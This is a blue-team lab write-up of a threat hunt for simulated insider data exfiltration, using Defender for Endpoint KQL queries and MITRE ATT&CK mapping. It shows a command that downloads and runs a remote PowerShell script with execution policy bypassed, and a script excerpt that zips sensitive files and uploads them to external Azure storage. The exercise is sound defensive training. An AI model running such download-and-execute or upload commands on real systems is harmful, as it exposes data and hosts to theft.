---
title: "Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration"
description: "A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network."
date: "2025-10-20"
author: "Samson Otori"
client: "Personal Project"
challenge: ""
solution: ""
results: []
category: "blue"
tags: ["Threat Hunting", "Microsoft Defender for Endpoint", "Data Exfiltration", "Insider Threat", "EDR", "KQL", "PowerShell"]
image: "/images/projects/Suspected Data Exfiltration.jpeg"
technologies: ["Microsoft Defender for Endpoint", "KQL", "PowerShell", "Windows"]
series:
  name: "Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration"
  order: 3
---

## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL – Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL – Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 – PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 – Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 – Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 – Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 – System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.
